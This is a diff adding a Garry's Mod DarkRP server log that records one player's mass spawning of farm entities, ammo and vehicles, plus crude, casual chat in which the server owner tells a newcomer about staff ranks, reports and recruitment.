@@ -1,0 +1,1525 @@
+<Logging continued from "data/ulx_logs/09-01-19.txt">
+[15:02:46] Client "DrDerpenstein sups.gg" connected.
+[15:04:28] Client "DrDerpenstein sups.gg" spawned in server <STEAM_0:0:13562763> (took 102 seconds).
+[15:08:35] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:37] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:38] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:38] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:08:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:09:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:09:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:13:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:20] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:35] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:36] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:13:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:15:19] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_drystation
+[15:15:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_packingstation
+[15:15:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_autopacker
+[15:22:23] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:22:23] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:22:23] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:22:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[15:22:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[15:22:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[15:22:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[15:22:24] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[15:22:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[15:22:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[15:22:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[15:22:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:25] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:26] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:26] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[15:22:26] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[15:22:26] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[15:22:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[15:22:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[15:22:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[15:22:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[15:22:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[15:22:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[15:22:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[15:22:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[15:22:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[15:22:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthcharger
+[15:22:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_healthcharger
+[15:22:29] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:29] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:39] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:40] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[15:22:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[15:22:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[15:22:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[15:22:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:42] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[15:22:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:22:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:22:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:22:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[15:23:41] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep cw_nen_glock17
+[15:23:49] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep cw_ar15
+[15:25:21] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/fcc/flying_crawler_car.mdl
+[15:32:22] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_generator
+[15:33:27] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:28] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:29] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:29] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:30] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:31] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:31] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:32] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:32] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:33:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:15] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:16] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:16] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:18] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:52] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:53] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:35:54] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_pot_hydro
+[15:37:10] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:12] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:13] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:13] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:13] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:13] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:37:13] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:45:08] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[15:45:08] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[15:45:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[15:45:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[15:45:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[15:45:11] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[15:45:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_drystation
+[15:45:54] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_drystation
+[15:56:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:56:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:08] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:09] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:09] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:09] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:09] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[15:57:17] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_soil
+[16:11:15] DrDerpenstein<STEAM_0:0:13562763> used the tool remover on maps/rp_downtown_tits_v2.bsp
+[16:11:15] DrDerpenstein<STEAM_0:0:13562763> used the tool remover on models/sligwolf/fcc/flying_crawler_car.mdl
+[16:12:40] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor.mdl
+[16:12:45] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor.mdl
+[16:12:48] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[16:12:50] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[16:12:55] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[16:12:58] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[16:13:18] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[16:13:20] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[16:38:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:33] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:34] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:35] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:38:35] DrDerpenstein<STEAM_0:0:13562763> spawned sent zwf_muffin
+[16:41:41] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[16:41:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_battery
+[16:41:43] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[16:41:44] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[16:41:44] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_smg1_large
+[16:41:44] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[16:41:44] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[16:41:44] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_357_large
+[16:41:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[16:41:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[16:41:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[16:41:45] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[16:41:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_large
+[16:41:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[16:41:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[16:41:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_ar2_altfire
+[16:41:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[16:41:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[16:41:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_pistol_large
+[16:41:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[16:41:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[16:41:47] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_rpg_round
+[16:41:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[16:41:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_ammo_crossbow
+[16:41:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[16:41:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[16:41:48] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[16:41:49] DrDerpenstein<STEAM_0:0:13562763> spawned sent item_box_buckshot
+[16:51:44] DrDerpenstein: models/Items/357ammobox.mdl
+[16:51:47] DrDerpenstein: models/Items/357ammo.mdl
+[16:51:52] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/357ammobox.mdl
+[16:51:56] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/357ammobox.mdl
+[16:51:56] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/357ammo.mdl
+[16:52:03] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/car_battery01.mdl
+[16:52:06] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/ammocrate_ar2.mdl
+[16:52:07] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/ammocrate_grenade.mdl
+[16:52:11] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/ammocrate_rockets.mdl
+[16:52:12] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/ammocrate_smg1.mdl
+[16:53:00] DrDerpenstein: models/Items/BoxMRounds.mdl
+[16:53:38] DrDerpenstein<STEAM_0:0:13562763> spawned effect models/items/flare.mdl
+[16:53:40] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/grenadeammo.mdl
+[16:53:43] DrDerpenstein<STEAM_0:0:13562763> spawned effect models/items/hevsuit.mdl
+[16:54:40] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/combine_rifle_ammo01.mdl
+[16:54:44] DrDerpenstein<STEAM_0:0:13562763> spawned model models/items/ar2_grenade.mdl
+[16:56:26] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor.mdl
+[16:56:46] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep pro_lockpick
+[16:58:29] DrDerpenstein<STEAM_0:0:13562763> spawned ragdoll models/combine_super_soldier.mdl
+[16:58:39] DrDerpenstein<STEAM_0:0:13562763> spawned ragdoll models/zombie/poison.mdl
+[16:58:52] DrDerpenstein<STEAM_0:0:13562763> spawned ragdoll models/humans/charple04.mdl
+[16:58:57] DrDerpenstein<STEAM_0:0:13562763> spawned ragdoll models/humans/charple01.mdl
+[17:03:03] DrDerpenstein<STEAM_0:0:13562763> spawned effect models/advisor.mdl
+[17:03:05] DrDerpenstein<STEAM_0:0:13562763> spawned ragdoll models/antlion.mdl
+[17:03:08] DrDerpenstein<STEAM_0:0:13562763> spawned ragdoll models/antlion_guard.mdl
+[17:03:28] DrDerpenstein<STEAM_0:0:13562763> spawned model models/combine_turrets/floor_turret.mdl
+[17:04:03] DrDerpenstein<STEAM_0:0:13562763> spawned sent combine_mine
+[17:06:46] DrDerpenstein<STEAM_0:0:13562763> spawned sent prop_thumper
+[17:07:00] DrDerpenstein<STEAM_0:0:13562763> spawned/gave himself swep keys
+[17:07:35] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor.mdl
+[17:09:34] Client "Derp" connected.
+[17:10:00] DrDerpenstein: /job Citizen
+[17:10:03] DrDerpenstein: /job Citizen
+[17:10:05] DrDerpenstein: /job Citizen
+[17:10:20] DrDerpenstein: /job Citizen
+[17:10:23] DrDerpenstein: /job Citizen
+[17:11:04] Client "Derp" spawned in server <STEAM_0:0:52504530> (took 90 seconds).
+[17:11:43] Derp: is the loading screen fucked for u too
+[17:11:54] Derp: um
+[17:11:55] Derp: no
+[17:12:11] Derp: i dont even know what the damn thing is called so its not like i can go into the addons and find it and remove it
+[17:12:36] Derp: its an addon from gmodstore
+[17:12:59] Derp: can u help me find out where the fuck its at
+[17:13:33] Derp: i think its called striper loading
+[17:13:41] Derp: or striped
+[17:14:53] Derp: let me ask UG
+[17:15:30] Derp: alright well idk how fast hes gonna reply so
+[17:15:34] Derp: lets do other stuff in the meanwhile
+[17:15:38] Derp: UG
+[17:15:59] Derp: yes
+[17:16:24] Derp: let me take the csgo knives off the collection
+[17:20:59] Derp<STEAM_0:0:52504530> spawned/gave himself swep cw_nen_berettapx4
+[17:21:23] DrDerpenstein<STEAM_0:0:13562763> used the tool remover on *72
+[17:25:53] Dropped "DrDerpenstein" from server<STEAM_0:0:13562763>
+[17:42:21] Dropped "Derp" from server<STEAM_0:0:52504530>
+
+
+
+[17:46:46] New map: rp_downtown_tits_v2
+[17:48:03] Client "DrDerpenstein sups.gg" connected.
+[17:48:33] Client "DrDerpenstein sups.gg" spawned in server <STEAM_0:0:13562763> (took 30 seconds).
+[17:49:08] DrDerpenstein: /unbox
+[17:51:04] Client "Derp" connected.
+[17:51:44] Client "Derp" spawned in server <STEAM_0:0:52504530> (took 40 seconds).
+[17:52:26] DrDerpenstein<STEAM_0:0:13562763> used the tool remover on *72
+[17:53:00] DrDerpenstein<STEAM_0:0:13562763> spawned model models/props_c17/fence02a.mdl
+[17:53:09] Derp<STEAM_0:0:52504530> spawned model models/props_c17/fence04a.mdl
+[17:53:11] DrDerpenstein<STEAM_0:0:13562763> spawned model models/props_c17/fence03a.mdl
+[17:53:14] Derp<STEAM_0:0:52504530> spawned model models/props_c17/fence01a.mdl
+[17:53:26] DrDerpenstein<STEAM_0:0:13562763> spawned model models/props_c17/fence04a.mdl
+[17:53:28] DrDerpenstein<STEAM_0:0:13562763> spawned model models/props_c17/fence03a.mdl
+[17:53:35] DrDerpenstein<STEAM_0:0:13562763> spawned model models/props_c17/fence02a.mdl
+[18:11:59] Client "Thomasツ" connected.
+[18:15:42] Client "Thomasツ" spawned in server <STEAM_0:0:121940340> (took 223 seconds).
+[18:16:48] Derp: hello
+[18:16:52] Thomasツ: Hi
+[18:16:56] Derp: i hear u btw
+[18:17:07] Derp: yeah im the owner and drderp is the co owner
+[18:17:28] Derp: we do that so that people dont know of our rank so easily
+[18:17:43] Derp: they can type @ and then a message and see what happens
+[18:17:59] Derp: they can also report people and i think the reports stay there even when we log on and it pops up
+[18:18:02] Derp: i could be wrong
+[18:18:20] Derp: if u type @ only a menu should pop up
+[18:18:25] Thomasツ: @
+[18:18:26] Derp: @
+[18:18:36] Thomasツ: @
+[18:18:50] Derp: oh yeah and u still can see our ranks if u click on us in the scoreboard its just harder to see
+[18:19:02] Derp: nah its fine dude
+[18:19:04] Derp: u have a valid point
+[18:19:16] Derp: we just like to be hidden so that people who break rules do it in front of us
+[18:19:22] Derp: yeah we have a forum
+[18:19:32] Thomasツ: !forums
+[18:19:38] Derp: nah lol
+[18:19:43] Derp: we are still a WIP we just let people play
+[18:19:52] Derp: although most of the important stuff is done
+[18:20:04] Derp: we do 
+[18:20:07] Derp: its bootleg as shit but it works
+[18:20:14] Derp: aight
+[18:20:23] Derp: https://discord.gg/nhgu8E
+[18:21:16] Derp: thanks for joining btw
+[18:21:25] Derp: sorry if the server seems fucking boring as shit
+[18:21:36] Derp: our biggest struggle is getting players
+[18:21:59] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor.mdl
+[18:22:04] Derp: if u wanna ask me something just msg me on discord
+[18:22:18] Derp: press F4 and click on info
+[18:23:12] Derp: i put on the template that u need to have minimum 48 hours
+[18:23:39] Derp: its just to see if u really are dedicated to the server or not
+[18:24:03] DrDerpenstein: !wcd
+[18:24:19] Derp: well if our entire playerbase that consists of like 5 people are all staff its not really gonna be of much help either
+[18:25:13] Derp: i mean to be fair i did have that time requirement when the server had like an average of 7 people everyday
+[18:25:17] Derp: i just havent changed it
+[18:25:24] Derp: ill lower it to 24
+[18:25:25] Derp: i think 24 is fair
+[18:25:45] Derp: what staff would u like to be anyways
+[18:25:48] Derp: like what position
+[18:26:17] Derp: i mean at the beginning i would probably make u mod and then promote u pretty soon after if u arent a complete dickhead
+[18:26:50] Derp: rip
+[18:26:59] Derp: lmao
+[18:27:09] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[18:27:16] Derp: :l
+[18:27:19] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[18:27:23] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[18:27:29] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[18:27:34] DrDerpenstein<STEAM_0:0:13562763> spawned vehicle models/sligwolf/tractor/tractor_trailer.mdl
+[18:27:46] Derp: that sounds like a fucking disaster
+[18:28:09] Derp: im glad i havent gone to another server in a long ass time
+[18:28:48] Derp: where are u taking us u fucking rapist
+[18:29:03] DrDerpenstein killed Derp using player
+[18:29:04] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/fence04a.mdl
+[18:29:20] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/gravestone002a.mdl
+[18:29:22] Derp: stay away from him hes gonna kidnap u at some point
+[18:29:50] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/props_c17/gravestone002a.mdl
+[18:29:55] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/props_c17/gravestone002a.mdl
+[18:29:56] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/props_c17/gravestone002a.mdl
+[18:29:57] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/props_c17/gravestone002a.mdl
+[18:29:59] Derp: we have like 20 people on our discord server and like only 2 people play
+[18:30:01] Derp: big rip
+[18:30:17] Derp: its hard to get people to play on darkrp servers because there are so many of them
+[18:30:30] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/props_c17/gravestone002a.mdl
+[18:30:31] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/hunter/plates/plate1x1.mdl
+[18:30:32] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/props_c17/gravestone002a.mdl
+[18:30:33] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/hunter/plates/plate1x1.mdl
+[18:30:41] Thomasツ<STEAM_0:0:121940340> used the tool textscreen on models/hunter/plates/plate1x1.mdl
+[18:31:22] Thomasツ<STEAM_0:0:121940340> spawned model models/props_c17/lampshade001a.mdl
+[18:31:55] Thomasツ suicided!
+[18:32:36] Thomasツ<STEAM_0:0:121940340> spawned model models/hunter/blocks/cube3x3x025.mdl
